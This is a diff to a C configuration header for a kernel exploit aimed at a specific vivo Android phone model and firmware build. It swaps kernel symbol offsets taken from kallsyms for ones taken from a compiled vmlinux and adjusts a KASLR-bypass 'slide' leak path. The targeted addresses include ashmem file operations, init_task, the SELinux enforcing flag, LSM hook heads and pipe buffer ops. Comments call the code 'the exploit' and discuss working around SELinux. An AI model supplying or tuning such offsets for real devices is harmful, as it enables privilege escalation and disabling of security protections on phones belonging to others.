@@ -4,20 +4,16 @@
 /*
  * vivo PD2417 (MT6989T, kernel 6.1.145-android14-11-maybe-dirty)
  *
- * All symbol offsets extracted offline from the kernel Image via
- * kallsyms token-table + relative_base decoding (no /proc/kallsyms
- * access required). FOPS field layout verified against ashmem_fops
- * and other fops structs in the image.
+ * All symbol offsets extracted from compiled vmlinux (System.map).
+ * Compiled from vivo MT6989T kernel source without LTO/PGO/BOLT,
+ * so offsets differ from the device kernel Image (which has LTO).
  *
- * NOTE: perf_event_paranoid = -1 on this device, so the perf-based
- * KASLR leak path will fail. The exploit falls back to the slide
- * leak path (boot_id / nfulnl_logger), which is verified to be
- * functional: nfulnl_logger.type == NF_LOG_TYPE_ULOG (1) and the
- * loggers[] BSS array is populated at runtime via nf_log_register().
+ * NOTE: Device kernel has LTO+PGO+BOLT — the actual device offsets
+ * may differ from these vmlinux offsets. This config is for the
+ * vmlinux-compiled kernel, not the stock device kernel.
  *
- * TODO: Struct offsets (TASK_*, CRED_*, PIPE_*, FAKE_TASK_*) are
- * copied from the duchamp target (kernel 6.6). They may need
- * adjustment for kernel 6.1 if the exploit fails.
+ * perf_event_paranoid = -1, but perf_event_open blocked by SELinux.
+ * SLIDE path is broken on this kernel (stack layout incompatibility).
  */
 
 #define BUILD_VARIANT_LABEL "vivo_PD2417_BP2A.250605.031.A3"
@@ -34,29 +30,30 @@
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
 #define PSELECT_WAITER_WORD_SHIFT 1
+#define PSELECT_TIMEOUT_SEC 2
 
-/* Symbol offsets (verified from extracted kallsyms) */
-#define ASHMEM_MISC_FOPS_OFF 0x022bb700ULL  /* ashmem_miscs + 0x10 (fops ptr in .data) */
-#define ASHMEM_FOPS_OFF 0x01291388ULL
-#define ASHMEM_IOCTL_OFF 0x00ca6d4cULL
-#define ASHMEM_COMPAT_IOCTL_OFF 0x00ca7674ULL  /* compat_ashmem_ioctl */
-#define ASHMEM_MMAP_OFF 0x00ca76ccULL
-#define ASHMEM_OPEN_OFF 0x00ca78f0ULL
-#define ASHMEM_RELEASE_OFF 0x00ca7990ULL
-#define ASHMEM_SHOW_FDINFO_OFF 0x00ca7a18ULL
-#define CONFIGFS_READ_ITER_OFF 0x004c0f4cULL
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004c147cULL
-#define COPY_SPLICE_READ_OFF 0x004414b8ULL  /* generic_file_splice_read (no copy_splice_read in 6.1) */
-#define NOOP_LLSEEK_OFF 0x003f3a0cULL
-#define INIT_TASK_OFF 0x0210fb40ULL
-#define INIT_UTS_NS_OFF 0x022e3640ULL
-#define EMPTY_ZERO_PAGE_OFF 0x02343000ULL
-#define ROOT_TASK_GROUP_OFF 0x0234a740ULL
-#define SELINUX_BLOB_SIZES_OFF 0x016332a0ULL
-#define SELINUX_ENFORCING_OFF 0x020aa9d8ULL  /* selinux_enforcing_boot */
-#define SECURITY_HOOK_HEADS_OFF 0x01632b90ULL
-#define KMALLOC_CACHES_OFF 0x016326c8ULL
-#define ANON_PIPE_BUF_OPS_OFF 0x01119550ULL
+/* Symbol offsets from vmlinux System.map (compiled w/o LTO/PGO/BOLT) */
+#define ASHMEM_MISC_FOPS_OFF 0x011002a8ULL  /* misc_fops */
+#define ASHMEM_FOPS_OFF 0x0115d3b0ULL
+#define ASHMEM_IOCTL_OFF 0x00be07a8ULL
+#define ASHMEM_COMPAT_IOCTL_OFF 0x00be1090ULL  /* compat_ashmem_ioctl */
+#define ASHMEM_MMAP_OFF 0x00be10e8ULL
+#define ASHMEM_OPEN_OFF 0x00be1308ULL
+#define ASHMEM_RELEASE_OFF 0x00be1390ULL
+#define ASHMEM_SHOW_FDINFO_OFF 0x00be14b0ULL
+#define CONFIGFS_READ_ITER_OFF 0x00449da4ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0044a2d4ULL
+#define COPY_SPLICE_READ_OFF 0x003cdb84ULL  /* generic_file_splice_read */
+#define NOOP_LLSEEK_OFF 0x00380cb4ULL
+#define INIT_TASK_OFF 0x01e7ee00ULL
+#define INIT_UTS_NS_OFF 0x01feee48ULL
+#define EMPTY_ZERO_PAGE_OFF 0x02048000ULL
+#define ROOT_TASK_GROUP_OFF 0x0204f540ULL
+#define SELINUX_BLOB_SIZES_OFF 0x01456590ULL
+#define SELINUX_ENFORCING_OFF 0x01e2a7f8ULL  /* selinux_enforcing_boot */
+#define SECURITY_HOOK_HEADS_OFF 0x01455e90ULL
+#define KMALLOC_CACHES_OFF 0x014559d8ULL
+#define ANON_PIPE_BUF_OPS_OFF 0x00ff5b90ULL
 
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -80,13 +77,14 @@
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
-/* SLIDE / KASLR leak path (boot_id -> nfulnl_logger address) */
-#define SLIDE_NFULNL_LOGGER_OFF 0x02102ee0ULL  /* nfulnl_logger struct */
-#define SLIDE_LOGGERS_0_1_OFF 0x02102e30ULL    /* loggers[0][1] = loggers + 8 (type=ULOG=1) */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x024a0850ULL  /* sysctl_bootid / boot_id buffer */
+/* SLIDE / KASLR leak path (boot_id -> nfulnl_logger address)
+ * All offsets from vmlinux System.map */
+#define SLIDE_NFULNL_LOGGER_OFF 0x01e72a20ULL  /* nfulnl_logger struct */
+#define SLIDE_LOGGERS_0_1_OFF 0x01e72970ULL    /* loggers[0][1] = loggers + 8 */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x020c2820ULL  /* sysctl_bootid (uuid buffer) */
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF 0x024a0850ULL  /* same as boot_id data */
+#define SLIDE_SYSCTL_BOOTID_OFF 0x020c2820ULL  /* sysctl_bootid = boot_id data */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
